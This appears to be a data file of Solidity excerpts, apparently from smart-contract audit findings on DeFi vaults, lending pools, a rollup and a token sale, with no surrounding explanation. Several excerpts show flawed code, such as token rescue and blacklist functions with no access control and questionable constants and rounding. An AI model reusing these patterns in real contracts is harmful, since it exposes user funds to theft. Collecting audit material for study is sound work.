"```\ngraph BT;\nclassDef nogap fill:#f96;\nclassDef hasgap fill:#99cc00;\n\nMetaStable2TokenAuraVault-->MetaStable2TokenVaultMixin::nogap\nMetaStable2TokenVaultMixin::nogap-->TwoTokenPoolMixin::nogap\nMetaStable2TokenVaultMixin::nogap-->BalancerOracleMixin::nogap\nTwoTokenPoolMixin::nogap-->PoolMixin::nogap\nPoolMixin::nogap-->AuraStakingMixin::nogap\nPoolMixin::nogap-->BalancerStrategyBase\n\nBalancerStrategyBase::hasgap-->BaseStrategyVault::hasgap\nBalancerStrategyBase::hasgap-->UUPSUpgradeable\n```\n```\ngraph BT;\nclassDef nogap fill:#f96;\nclassDef hasgap fill:#99cc00;\n\nBoosted3TokenAuraVault-->Boosted3TokenPoolMixin::nogap\nBoosted3TokenPoolMixin::nogap-->PoolMixin::nogap\nPoolMixin::nogap-->BalancerStrategyBase\nPoolMixin::nogap-->AuraStakingMixin::nogap\nBalancerStrategyBase::hasgap-->BaseStrategyVault::hasgap\nBalancerStrategyBase::hasgap-->UUPSUpgradeable\n```\n```\nabstract contract BaseStrategyVault is Initializable, IStrategyVault {\n    using TokenUtils for IERC20;\n    using TradeHandler for Trade;\n\n    // Storage gap for future potential upgrades\n    uint256[45] private __gap;\n}\n```\n```\nabstract contract BalancerStrategyBase is BaseStrategyVault, UUPSUpgradeable {\n    uint32 internal immutable SETTLEMENT_PERIOD_IN_SECONDS;\n\n    // Storage gap for future potential upgrades\n    uint256[100] private __gap;\n}\n```"
"```\nfunction checkApprove(IERC20 token, address spender, uint256 amount) internal {\n    if (address(token) == address(0)) return;\n\n    IEIP20NonStandard(address(token)).approve(spender, amount);\n    _checkReturnCode();\n}\n```\n```\nfunction _approveBalancerTokens(TwoTokenPoolContext memory poolContext, address bptSpender) internal {\n    IERC20(poolContext.primaryToken).checkApprove(address(Deployments.BALANCER_VAULT), type(uint256).max);\n    IERC20(poolContext.secondaryToken).checkApprove(address(Deployments.BALANCER_VAULT), type(uint256).max);\n    IERC20(address(poolContext.basePool.pool)).checkApprove(bptSpender, type(uint256).max);\n}\n```\n```\nfunction _approveBalancerTokens(ThreeTokenPoolContext memory poolContext, address bptSpender) internal {\n    poolContext.basePool._approveBalancerTokens(bptSpender);\n\n    IERC20(poolContext.tertiaryToken).checkApprove(address(Deployments.BALANCER_VAULT), type(uint256).max);\n\n    IBoostedPool underlyingPool = IBoostedPool(poolContext.basePool.primaryToken);\n    address primaryUnderlyingAddress = BalancerUtils.getTokenAddress(underlyingPool.getMainToken());\n    IERC20(primaryUnderlyingAddress).checkApprove(address(Deployments.BALANCER_VAULT), type(uint256).max);\n}\n```\n```\nfunction _approve(Trade memory trade, address spender) private {\n    /// @notice Approve exchange to pull from this contract\n    /// @dev approve up to trade.amount for EXACT_IN trades and up to trade.limit for EXACT_OUT trades\n    uint256 allowance = _isExactIn(trade)? trade.amount : trade.limit;\n    IERC20(trade.sellToken).checkApprove(spender, allowance);\n}\n```\n```\nfunction someFunction() public {\n    IERC20(buyToken).checkApprove(address(Deployments.WRAPPED_STETH), amountBought);\n    uint256 wrappedAmount = Deployments.WRAPPED_STETH.balanceOf(address(this));\n    Deployments.WRAPPED_STETH.wrap(amountBought);\n    amountBought = Deployments.WRAPPED_STETH.balanceOf(address(this)) - wrappedAmount;\n}\n```"
"```\nrequire(account!= Constants.RESERVE); // Reserve address is address(0)\nrequire(account!= address(this));\n\n(\n    uint256 isNToken,\n    /* incentiveAnnualEmissionRate */,\n    /* lastInitializedTime */,\n    /* assetArrayLength */,\n    /* parameters */\n) = nTokenHandler.getNTokenContext(account);\n\nrequire(isNToken == 0);\n```"
"```\nconstructor(\n    NotionalProxy notional_,\n    AuraVaultDeploymentParams memory params\n) PoolMixin(notional_, params) {\n    uint256 primaryDecimals = IERC20(primaryAddress).decimals();\n    // Do not allow decimal places greater than 18\n    require(primaryDecimals <= 18);\n    PRIMARY_DECIMALS = uint8(primaryDecimals);\n\n    uint256 secondaryDecimals = address(SECONDARY_TOKEN) == Deployments.ETH_ADDRESS\n       ? 18\n        : SECONDARY_TOKEN.decimals();\n    require(secondaryDecimals <= 18);\n    SECONDARY_DECIMALS = uint8(secondaryDecimals);\n}\n```\n```\nfunction _getSpotPrice(\n    StableOracleContext memory oracleContext, \n    TwoTokenPoolContext memory poolContext, \n    uint256 tokenIndex\n) internal view returns (uint256 spotPrice) {\n    require(poolContext.primaryDecimals < 19); \n    require(poolContext.secondaryDecimals < 19); \n    require(tokenIndex < 2); \n}\n```"
"```\nstrategyToken = (totalBPTHeld == 0)? bptClaim : (bptClaim * totalStrategyToken) / totalBPTHeld\n```\n```\nfunction _convertBPTClaimToStrategyTokens(StrategyContext memory context, uint256 bptClaim)\n    internal pure returns (uint256 strategyTokenAmount) {\n    if (context.totalBPTHeld == 0) {\n        return (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / \n            BalancerConstants.BALANCER_PRECISION;\n    }\n\n    strategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.totalBPTHeld;\n}\n```\n```\nstrategyToken = (bptClaim * totalStrategyToken) / totalBPTHeld\n\nstrategy_token = (19999 * 1) / 10000\n```\n```\nbptReceived = (strategyToken * totalBPTHeld) / totalStrategyToken\nbptReceived = (strategyToken * totalBPTHeld) / totalStrategyToken\n```\n```\nstrategyToken = (bptClaim * totalStrategyToken) / totalBPTHeld\nstrategy_token = (9999 * 1) / 10000\n```\n```\nfunction _baseStrategyContext() internal view returns (StrategyContext memory) {\n    return StrategyContext({\n        totalBPTHeld: _bptHeld(),\n        settlementPeriodInSeconds: SETTLEMENT_PERIOD_IN_SECONDS,\n        tradingModule: TRADING_MODULE,\n        vaultSettings: BalancerVaultStorage.getStrategyVaultSettings(),\n        vaultState: BalancerVaultStorage.getStrategyVaultState(),\n        feeReceiver: FEE_RECEIVER\n    });\n}\n```\nFile: PoolMixin.sol\n\nfunction _bptHeld() internal view returns (uint256) {\n    return AURA_REWARD_POOL.balanceOf(address(this));\n}\n```\n```\nFile: BaseRewardPool4626.sol\n\nfunction balanceOf(address account) public view override(BaseRewardPool, IERC20) returns (uint256) {\n    return BaseRewardPool.balanceOf(account);\n}\n```\n```\nfunction balanceOf(address account) public view virtual returns (uint256) {\n    return _balances[account];\n}\n```\n```\nFile: BaseRewardPool4626.sol\n\nfunction deposit(uint256 assets, address receiver) public virtual override nonReentrant returns (uint256) {\n    // Transfer ""asset"" (crvLP) from sender\n    IERC20(asset).safeTransferFrom(msg.sender, address(this), assets);\n\n    // Convert crvLP to cvxLP through normal booster deposit process, but don't stake\n    uint256 balBefore = stakingToken.balanceOf(address(this));\n    IDeposit(operator).deposit(pid, assets, false);\n    uint256 balAfter = stakingToken.balanceOf(address(this));\n\n    require(balAfter.sub(balBefore) >= assets, ""!deposit"");\n\n    // Perform stake manually, now that the funds have been received\n    _processStake(assets, receiver);\n\n    emit Deposit(msg.sender, receiver, assets, assets);\n    emit Staked(receiver, assets);\n    return assets;\n}\n```\n```\nFile: BaseRewardPool.sol\n\nfunction _processStake(uint256 _amount, address _receiver) internal updateReward(_receiver) {\n    require(_amount > 0, 'RewardPool : Cannot stake 0');\n\n    for (uint i = 0; i < extraRewards.length; i++) {\n        IRewards(extraRewards[i]).stake(_receiver, _amount);\n    }\n\n    _totalSupply = _totalSupply.add(_amount);\n    _balances[_receiver] = _balances[_receiver].add(_amount);\n}\n```"
"```\nspender = address(Deployments.UNIV2_ROUTER)\ntarget = address(Deployments.UNIV2_ROUTER)\n\nif (\n    tradeType == TradeType.EXACT_IN_SINGLE ||\n    tradeType == TradeType.EXACT_IN_BATCH\n) {\n    executionCallData = abi.encodeWithSelector(\n        IUniV2Router2.swapExactTokensForTokens.selector,\n        trade.amount,\n        trade.limit,\n        data.path,\n        from,\n        trade.deadline\n    )\n} else if (\n    tradeType == TradeType.EXACT_OUT_SINGLE ||\n    tradeType == TradeType.EXACT_OUT_BATCH\n) {\n    executionCallData = abi.encodeWithSelector(\n        IUniV2Router2.swapTokensForExactTokens.selector,\n        trade.amount,\n        trade.limit,\n        data.path,\n        from,\n        trade.deadline\n    )\n}"
```\nIUniV2Router2 internal constant UNIV2_ROUTER = \n    IUniV2Router2(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n```
"```\nstakingContext.auraRewardPool.withdrawAndUnwrap(\n    bptClaim,\n    false\n)\n```\ninterface IAuraRewardPool {\n    function withdrawAndUnwrap(uint256 amount, bool claim) external returns (bool);\n```\n```\nfunction withdrawAndUnwrap(uint256 amount, bool claim) public updateReward(msg.sender) returns (bool) {\n```"
"```\nstakingContext.auraBooster.deposit(stakingContext.auraPoolId, bptMinted, true)\n```\n```\nfunction deposit(uint256 _pid, uint256 _amount, bool _stake) public returns(bool) {\n    /**\n     * Deposits an ""_amount"" to a given gauge (specified by _pid), mints a `DepositToken`\n     * and subsequently stakes that on Convex BaseRewardPool\n     */\n```"
"```\nfunction settleVault(uint256 maturity, uint256 strategyTokens, bytes calldata settlementTrade) external {\n    require(maturity <= block.timestamp, ""Cannot Settle"");\n    VaultState memory vaultState = NOTIONAL.getVaultState(address(this), maturity);\n    require(vaultState.isSettled == false);\n    require(vaultState.totalStrategyTokens >= strategyTokens);\n\n    RedeemParams memory params = abi.decode(settlementTrade, (RedeemParams));\n\n    uint256 underlyingValue = convertStrategyToUnderlying(\n        address(0),\n        vaultState.totalStrategyTokens,\n        maturity\n    ).toUint();\n\n    uint256 minAllowedPurchaseAmount = (underlyingValue * settlementSlippageLimit) / SETTLEMENT_SLIPPAGE_PRECISION;\n    require(params.minPurchaseAmount >= minAllowedPurchaseAmount, ""Purchase Limit"");\n\n    NOTIONAL.redeemStrategyTokensToCash(maturity, strategyTokens, settlementTrade);\n\n    vaultState = NOTIONAL.getVaultState(address(this), maturity);\n    if (vaultState.totalStrategyTokens == 0) {\n        NOTIONAL.settleVault(address(this), maturity);\n    }\n}\n```\n```\nfunction _redeemFromNotional(\n    address account,\n    uint256 strategyTokens,\n    uint256 maturity,\n    bytes calldata data\n) internal override returns (uint256 borrowedCurrencyAmount) {\n    uint256 balanceBefore = LEND_UNDERLYING_TOKEN.balanceOf(address(this));\n    RedeemParams memory params = abi.decode(data, (RedeemParams));\n\n    if (maturity <= block.timestamp) {\n        require(account == address(this));\n        NOTIONAL.settleAccount(address(this));\n        (int256 cashBalance,, ) = NOTIONAL.getAccountBalance(LEND_CURRENCY_ID, address(this));\n\n        require(0 <= cashBalance && cashBalance <= int256(uint256(type(uint88).max));\n\n        NOTIONAL.withdraw(LEND_CURRENCY_ID, uint88(uint256(cashBalance)), true);\n    } else {\n        BalanceActionWithTrades[] memory action = _encodeBorrowTrade(\n            maturity,\n            strategyTokens,\n            params.maxBorrowRate\n        );\n        NOTIONAL.batchBalanceAndTradeAction(address(this), action);\n\n        AccountContext memory accountContext = NOTIONAL.getAccountContext(address(this));\n        require(accountContext.hasDebt == 0x00);\n    }\n\n    uint256 balanceAfter = LEND_UNDERLYING_TOKEN.balanceOf(address(this));\n\n    Trade memory trade = Trade({\n        tradeType: TradeType.EXACT_IN_SINGLE,\n        sellToken: address(LEND_UNDERLYING_TOKEN),\n        buyToken: address(_underlyingToken()),\n        amount: balanceAfter - balanceBefore,\n        limit: params.minPurchaseAmount,\n        deadline: block.timestamp,\n        exchangeData: params.exchangeData\n    });\n\n    (, borrowedCurrencyAmount) = _executeTrade(params.dexId, trade);\n}"
"```\nabstract contract BaseStrategyVault is Initializable, IStrategyVault {\n    using TokenUtils for IERC20;\n    using TradeHandler for Trade;\n\n    // @notice Hardcoded on the implementation contract during deployment\n    NotionalProxy public immutable NOTIONAL;\n    ITradingModule public immutable TRADING_MODULE;\n    uint8 constant internal INTERNAL_TOKEN_DECIMALS = 8;\n\n    // Storage gap for future potential upgrades\n    uint256[45] private __gap;\n}\n```\n```\ncontract CrossCurrencyfCashVault is BaseStrategyVault {\n    using TypeConvert for uint256;\n    using TypeConvert for int256;\n\n    uint256 public constant SETTLEMENT_SLIPPAGE_PRECISION = 1e18;\n\n    struct DepositParams {\n        uint256 minPurchaseAmount;\n        uint32 minLendRate;\n        uint16 dexId;\n        // Exchange data depending on the selected dexId\n    }\n```"
"```\nfunction reinvestReward(\n    MetaStable2TokenAuraStrategyContext calldata context,\n    ReinvestRewardParams calldata params\n)\n```\noracleContext._validateSpotPriceAndPairPrice({\n    poolContext: poolContext,\n    strategyContext: strategyContext,\n    primaryAmount: primaryAmount,\n    secondaryAmount: secondaryAmount\n})\n```\nuint256 spotPrice = _getSpotPrice(oracleContext, poolContext, 0);\n```\n```\n(uint256 balanceX, uint256 balanceY) = \n    tokenIndex == 0? \n        (poolContext.primaryBalance, poolContext.secondaryBalance) : \n        (poolContext.secondaryBalance, poolContext.primaryBalance);\n\nuint256 invariant = \n    StableMath._calculateInvariant(\n        oracleContext.ampParam, \n        StableMath._balances(balanceX, balanceY), \n        true  // round up\n    );\n\nspotPrice = \n    StableMath._calcSpotPrice({\n        amplificationParameter: oracleContext.ampParam,\n        invariant: invariant,\n        balanceX: balanceX,\n        balanceY: balanceY\n    });\n```\n```\n(uint256 value, \n    bool isUpdating, \n    uint256 precision) = \n    IMetaStablePool(address(BALANCER_POOL_TOKEN)).getAmplificationParameter();\n```\n```\n/**************************************************************************************************************\n// Calculate spot price Y/X\n// spot price Y/X = - dx/dy = -----------------------\n// 2.a.x.y + a.y^2 + b.y\n// spot price Y/X = - dx/dy = -----------------------\n// 2.a.x.y + a.x^2 + b.x\n\n// Parameters\nn = 2\na = amp param * n\nb = D + a.(S - D)\nD = invariant\nS = sum of balances\n// x and y are the only tokens\n**************************************************************************************************************/\n```\n```\nuint256 internal constant _AMP_PRECISION = 1e3;\n```\nuint256 a = (amplificationParameter * 2) / _AMP_PRECISION;\n```\n```\nfunction reinvestReward(\n    Boosted3TokenAuraStrategyContext calldata context,\n    ReinvestRewardParams calldata params\n)\n```\nuint256 minBPT = context.poolContext._getMinBPT(\n    oracleContext,\n    strategyContext,\n    primaryAmount\n);\n```\nminBPT = StableMath._calcBptOutGivenExactTokensIn({\n    amp: oracleContext.ampParam,\n    balances: balances,\n    amountsIn: amountsIn,\n    bptTotalSupply: virtualSupply,\n    swapFeePercentage: 0,\n    currentInvariant: invariant\n})\n```\nuint256 newInvariant = _calculateInvariant(amp, newBalances, false);\nuint256 invariantRatio = newInvariant / currentInvariant;\n```\nuint256 ampTimesTotal = amplificationParameter * numTokens;\n```\n(uint256 value,\n    // bool isUpdating,\n    // uint256 precision\n) = pool.getAmplificationParameter();"
"```\nmodifier whenNotPaused() {\n    _whenNotPaused();\n    _\n}\n```\nfunction withdraw(\n    address asset,\n    uint256 amount,\n    address to\n) external override whenNotPaused returns (uint256) {\n```"
"```\nfunction validateWithdraw(\n    address reserveAddress,\n    uint256 amount,\n    uint256 userBalance,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    DataTypes.UserConfigurationMap storage userConfig,\n    mapping(uint256 => address) storage reserves,\n    uint256 reservesCount,\n    address oracle\n) external view {\n    require(amount!= 0, Errors.VL_INVALID_AMOUNT);\n```"
"```\nfunction join(uint256 amount) external override joiningNotPaused {\n    uint256 fee = amount.mul(joiningFee).div(BASIS_PRECISION);\n    uint256 mintedAmount = mint(amount.sub(fee));\n    claimableFees = claimableFees.add(fee);\n\n    latestJoinBlock[msg.sender] = block.number;\n    token.safeTransferFrom(msg.sender, address(this), amount);\n\n    emit Joined(msg.sender, amount, mintedAmount);\n}\n```\nfunction setJoiningFee(uint256 fee) external onlyOwner {\n    require(fee <= BASIS_PRECISION, ""TrueFiPool: Fee cannot exceed transaction value"");\n    joiningFee = fee;\n    emit JoiningFeeChanged(fee);\n}\n```\n```\nuint256 private constant BASIS_PRECISION = 10000;\n```"
"```\nfunction getCErc20Price(ICToken cToken, address underlying) internal view returns (uint) {\n    return cToken.exchangeRateStored()\n       .mulDivDown(1e8, IERC20(underlying).decimals())\n       .mulWadDown(oracle.getPrice(underlying));\n}"
"```\nfunction totalAssets() public view override returns (uint) {\n    return asset.balanceOf(address(this)) \n        + getBorrows() \n        - getReserves();\n}\n```\n```\nfunction getBorrows() public view returns (uint) {\n    return borrows + borrows.mulWadUp(getRateFactor());\n}\n```\n```\nfunction getReserves() public view returns (uint) {\n    return reserves + borrows.mulWadUp(getRateFactor())\n       .mulWadUp(reserveFactor);\n}\n```\n```\nfunction lendTo(address account, uint amt)\n    external\n    whenNotPaused\n    accountManagerOnly\n    returns (bool isFirstBorrow)\n{\n    updateState();\n    isFirstBorrow = (borrowsOf[account] == 0);\n\n    uint borrowShares;\n    require((borrowShares = convertAssetToBorrowShares(amt))!= 0, ""ZERO_BORROW_SHARES"");\n    totalBorrowShares += borrowShares;\n    borrowsOf[account] += borrowShares;\n\n    borrows += amt;\n    asset.safeTransfer(account, amt);\n    return isFirstBorrow;\n}\n```"
"```\nfunction getPrice(address token) external view returns (uint) {\n    uint decimals = IERC4626(token).decimals();\n    return IERC4626(token).previewRedeem(10 ** decimals).mulDivDown(\n        oracleFacade.getPrice(IERC4626(token).asset()),\n        10 ** decimals\n    );\n}\n```\n```\nfunction previewRedeem(uint256 shares) public view virtual returns (uint256) {\n    return convertToAssets(shares);\n}\n```\n```\nfunction convertToAssets(uint256 shares) public view virtual returns (uint256) {\n    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n    return supply == 0? shares : shares.mulDivDown(totalAssets(), supply);\n}\n```"
"```\nfunction getRateFactor() internal view returns (uint) {\n    return (block.timestamp == lastUpdated)?\n        0 :\n        ((block.timestamp - lastUpdated) * 1e18)\n           .mulWadUp(\n                rateModel.getBorrowRatePerSecond(\n                    asset.balanceOf(address(this)),\n                    borrows\n                )\n            );\n}\n```\n```\nfunction getBorrowRatePerSecond(\n    uint liquidity,\n    uint borrows\n)\n    external\n    view\n    returns (uint)\n{\n    uint util = _utilization(liquidity, borrows);\n    return c3.mulDivDown(\n        (\n            util.mulWadDown(c1)\n            + util.rpow(32, SCALE).mulWadDown(c1)\n            + util.rpow(64, SCALE).mulWadDown(c2)\n        ),\n        secsPerYear\n    );\n}\n```\n```\nfunction _utilization(uint liquidity, uint borrows)\n    internal\n    pure\n    returns (uint)\n{\n    uint totalAssets = liquidity + borrows;\n    return (totalAssets == 0)? 0 : borrows.divWadDown(totalAssets);\n}\n```"
```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```
"```\nfunction getPrice(address pair) external view returns (uint) {\n    (uint r0, uint r1,) = IUniswapV2Pair(pair).getReserves();\n\n    return FixedPointMathLib.sqrt(\n        r0.mulWadDown(r1)\n       .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token0()))\n       .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token1()))\n    )\n   .mulDivDown(2e27, IUniswapV2Pair(pair).totalSupply());\n}\n```\nuint256 internal constant WAD = 1e18;  // The scalar of ETH and most ERC20s.\n\nfunction mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {\n    return mulDivDown(x, y, WAD);  // Equivalent to (x * y) / WAD rounded down.\n}\n```\n```\nfunction mulDivDown(\n    uint256 x,\n    uint256 y,\n    uint256 denominator\n) internal pure returns (uint256 z) {\n    assembly {\n        z := mul(x, y)\n\n        if iszero(and(iszero(iszero(denominator)), or(iszero(x), eq(div(z, x), y)))) {\n            revert(0, 0)\n        }\n\n        z := div(z, denominator)\n    }\n}"
"```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (, uint256[2] memory amounts) = abi.decode(data[4:], (uint256, uint256[2]));\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    uint i;\n    uint j;\n    address[] memory tokensIn = new address[](2);\n    while (i < 2) {\n        if (amounts[i] > 0) {\n            tokensIn[j++] = IStableSwapPool(target).coins(i);\n        }\n        unchecked { ++i; }\n    }\n    assembly { mstore(tokensIn, j) }\n\n    return (true, tokensIn, tokensOut);\n}\n```"
"```\nfunction borrow(\n    address account,\n    address token,\n    uint amt\n) \n    external\n    whenNotPaused\n    onlyOwner(account)\n{\n    if (registry.LTokenFor(token) == address(0))\n        revert Errors.LTokenUnavailable();\n    if (!riskEngine.isBorrowAllowed(account, token, amt))\n        revert Errors.RiskThresholdBreached();\n    if (IAccount(account).hasAsset(token) == false)\n        IAccount(account).addAsset(token);\n    if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n        IAccount(account).addBorrow(token);\n    emit Borrow(account, msg.sender, token, amt);\n}\n```\n```\nfunction liquidate(address account) external {\n    if (riskEngine.isAccountHealthy(account)) {\n        revert Errors.AccountNotLiquidatable();\n    }\n    _liquidate(account);\n    emit AccountLiquidated(account, registry.ownerFor(account));\n}\n```\n```\nfunction _getBalance(address account) internal view returns (uint) {\n    address[] memory assets = IAccount(account).getAssets();\n    uint assetsLen = assets.length;\n    uint totalBalance;\n    for (uint i = 0; i < assetsLen; ++i) {\n        totalBalance += _valueInWei(assets[i], IERC20(assets[i]).balanceOf(account));\n    }\n    return totalBalance + account.balance;\n}\n```"
"```\nif (!isContract(target)):\n    Errors.AddressNotContract\n```\n```\n(bool success,) = target.delegatecall(data);\nrequire(success, ""CALL_FAILED"");\n```"
"```\nfunction mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {\n    _mint(to, amount);\n}\n```"
"```\nuint256 deployerPrivateKey = vm.envUint(""PRIVATE_KEY"");\n```\n```\nuint256 deployerPrivateKey = vm.envUint(""PRIVATE_KEY"");\nvm.startBroadcast(deployerPrivateKey);\n```"
"```\nfunction rescue(IERC20 token, address to, uint256 amount) public virtual {\n    token.transfer(to, amount);\n}\n```\n```\nfunction blacklist(address account) public virtual {\n    _blacklisted[account] = true;\n    emit Blacklisted(account);\n}\n\nfunction unBlacklist(address account) public virtual {\n    _blacklisted[account] = false;\n    emit UnBlacklisted(account);\n}\n```"
"```\nabstract contract BlacklistableV1 is\n    Initializable,\n    ContextUpgradeable,\n    ERC20Upgradeable {\n```\n```\nabstract contract RescuableV1 is\n    Initializable,\n    ContextUpgradeable,\n    ERC20Upgradeable {\n```\n```\ncontract FiatTokenV1 is\n    Initializable,\n    ERC20Upgradeable,\n    ERC20PausableUpgradeable,\n    ERC20BurnableUpgradeable,\n    AccessControlUpgradeable,\n    ERC20PermitUpgradeable,\n    UUPSUpgradeable,\n    BlacklistableV1,\n    RescuableV1\n{\n```"
```\nconstructor() {\n    _disableInitializers();\n}\n```
```\ncurrentL2BlockNumber = _finalizationData.finalBlockNumber\n```\n```\nif (stateRootHashes[currentL2BlockNumber]!= _finalizationData.parentStateRootHash):\n    revert StartingRootHashDoesNotMatch()\n```
"```\nif (stateRootHashes[currentL2BlockNumber]!= _finalizationData.parentStateRootHash):\n    revert StartingRootHashDoesNotMatch()\n```\n```\nif (finalizationDataDataHashesLength!= 0) {\n    bytes32 startingDataParentHash = dataParents[_finalizationData.dataHashes[0]];\n    if (startingDataParentHash!= _finalizationData.dataParentHash) {\n        revert ParentHashesDoesNotMatch(startingDataParentHash, _finalizationData.dataParentHash);\n    }\n    bytes32 startingParentFinalStateRootHash = dataFinalStateRootHashes[startingDataParentHash];\n    if (startingParentFinalStateRootHash!= _finalizationData.parentStateRootHash) {\n        revert FinalStateRootHashDoesNotMatch(startingParentFinalStateRootHash, _finalizationData.parentStateRootHash);\n    }\n```"
"```\n_addL2MerkleRoots(\n    _finalizationData.l2MerkleRoots,\n    _finalizationData.l2MerkleTreesDepth\n)\n_anchorL2MessagingBlocks(\n    _finalizationData.l2MessagingBlocksOffsets,\n    lastFinalizedBlock\n)"
"```\nuint256 publicInput = uint256(\n    keccak256(\n        abi.encode(\n            snarf,\n            _finalizationData.parentStateRootHash,\n            _finalizationData.lastFinalizedTimestamp,\n            _finalizationData.finalBlockNumber,\n            _finalizationData.finalTimestamp,\n            _finalizationData.l1RollingHash,\n            _finalizationData.l1RollingHashMessageNumber,\n            keccak256(abi.encodePacked(_finalizationData.l2MerkleRoots))\n        )\n    )\n);\n```\n_addL2MerkleRoots(\n    _finalizationData.l2MerkleRoots,\n    _finalizationData.l2MerkleTreesDepth\n)"
"```\nshnarf = keccak256(\n    abi.encode(\n        shnarf,\n        _submissionData.snarkHash,\n        _submissionData.finalStateRootHash,\n        compressedDataComputedX,\n        _calculateY(_submissionData.compressedData, compressedDataComputedX)\n    )\n)\n```\nfunction _submitData(SubmissionData calldata _submissionData) internal returns (bytes32 shnarf) {\n    shnarf = dataShnarfHashes[_submissionData.dataParentHash];\n\n    bytes32 parentFinalStateRootHash = dataFinalStateRootHashes[_submissionData.dataParentHash];\n    uint256 lastFinalizedBlock = currentL2BlockNumber;\n\n    if (_submissionData.firstBlockInData <= lastFinalizedBlock) {\n        revert FirstBlockLessThanOrEqualToLastFinalizedBlock(_submissionData.firstBlockInData, lastFinalizedBlock);\n    }\n\n    if (_submissionData.firstBlockInData > _submissionData.finalBlockInData) {\n        revert FirstBlockGreaterThanFinalBlock(_submissionData.firstBlockInData, _submissionData.finalBlockInData);\n    }\n\n    if (_submissionData.parentStateRootHash!= parentFinalStateRootHash) {\n        revert StateRootHashInvalid(parentFinalStateRootHash, _submissionData.parentStateRootHash);\n    }\n\n    bytes32 currentDataHash = keccak256(_submissionData.compressedData);\n\n    if (dataFinalStateRootHashes[currentDataHash]!= EMPTY_HASH) {\n        revert DataAlreadySubmitted(currentDataHash);\n    }\n\n    dataParents[currentDataHash] = _submissionData.dataParentHash;\n    dataFinalStateRootHashes[currentDataHash] = _submissionData.finalStateRootHash;\n\n    bytes32 compressedDataComputedX = keccak256(abi.encode(_submissionData.snarkHash, currentDataHash));\n\n    shnarf = keccak256(\n        abi.encode(\n            shnarf,\n            _submissionData.snarkHash,\n            _submissionData.finalStateRootHash,\n            compressedDataComputedX,\n            _calculateY(_submissionData.compressedData, compressedDataComputedX)\n        )\n    );\n\n    dataShnarfHashes[currentDataHash] = shnarf;\n\n    emit DataSubmitted(currentDataHash, _submissionData.firstBlockInData, _submissionData.finalBlockInData);\n}\n```\n```\nfunction _calculateY(\n    bytes calldata _data,\n    bytes32 _compressedDataComputedX\n) internal pure returns (bytes32 compressedDataComputedY) {\n    if (_data.length % 0x20!= 0) {\n        revert BytesLengthNotMultipleOf32();\n    }\n\n    bytes4 errorSelector = ILineaRollup.FirstByteIsNotZero.selector;\n    assembly {\n        for {\n            let i := _data.length\n        } gt(i, 0) {\n            i := sub(i, 0x20)\n            let chunk := calldataload(add(_data, i))\n            if iszero(iszero(and(chunk, 0xFF00000000000000000000000000000000000000000000000000000000000000))) {\n                let ptr := mload(0x40)\n                mstore(ptr, errorSelector)\n                revert(ptr, 0x4)\n            }\n            compressedDataComputedY := addmod(\n                mulmod(compressedDataComputedY, _compressedDataComputedX, Y_MODULUS),\n                chunk,\n                Y_MODULUS\n            )\n        }\n    }\n}\n```"
```\nfunction submitData(\n    SubmissionData calldata _submissionData\n) \n    external\n    whenTypeNotPaused(PROVING_SYSTEM_PAUSE_TYPE)\n    whenTypeNotPaused(GENERAL_PAUSE_TYPE)\n    onlyRole(OPERATOR_ROLE)\n{\n    _submitData(_submissionData);\n}\n```
"```\nfunction buy(uint256 _amount, address _tokenReceiver) public whenNotPaused nonReentrant {\n    uint256 currencyAmount = Math.ceilDiv(_amount * getPrice(), 10 ** token.decimals());\n```"
"```\nfunction buy(uint256 _amount, address _tokenReceiver) public whenNotPaused nonReentrant {\n    uint256 currencyAmount = Math.ceilDiv(_amount * getPrice(), 10 ** token.decimals());\n\n    (uint256 fee, address feeCollector) = _getFeeAndFeeReceiver(currencyAmount);\n    if (fee!= 0) {\n        currency.safeTransferFrom(_msgSender(), feeCollector, fee);\n    }\n\n    currency.safeTransferFrom(_msgSender(), _tokenReceiver, currencyAmount - fee);\n    _checkAndDeliver(_amount, _tokenReceiver);\n\n    emit TokensBought(_msgSender(), _amount, currencyAmount);\n}\n```"
"```\nuint256 currencyAmount = Math.ceilDiv(\n    _arguments.tokenAmount * _arguments.tokenPrice,\n    10 ** _arguments.token.decimals()\n);\n```"
"```\nrequire(\n    _arguments.tokenPrice!= 0,\n    ""_tokenPrice needs to be a non-zero amount""\n)\n```\nrequire(\n    _arguments.minAmountPerBuyer <= _arguments.maxAmountPerBuyer,\n    ""_minAmountPerBuyer needs to be smaller or equal to _maxAmountPerBuyer""\n);\n```\n```\nlast_buy_date = _arguments.last_buy_date\n```\n```\nfunction _checkAndDeliver(uint256 _amount, address _tokenReceiver) internal {\n    require(tokensSold + _amount <= maxAmountOfTokenToBeSold, ""Not enough tokens to sell left"");\n    require(tokensBought[_tokenReceiver] + _amount >= minAmountPerBuyer, ""Buyer needs to buy at least minAmount"");\n    require(\n        tokensBought[_tokenReceiver] + _amount <= maxAmountPerBuyer,\n        ""Total amount of bought tokens needs to be lower than or equal to maxAmount""\n    );\n\n    if (lastBuyDate!= 0 && block.timestamp > lastBuyDate) {\n        revert(""Last buy date has passed: not selling tokens anymore."");\n    }\n\n    tokensSold += _amount;\n    tokensBought[_tokenReceiver] += _amount;\n\n    token.mint(_tokenReceiver, _amount);\n}\n```\nrequire(address(_arguments.currency)!= address(0), ""currency cannot be zero address"");\n```"
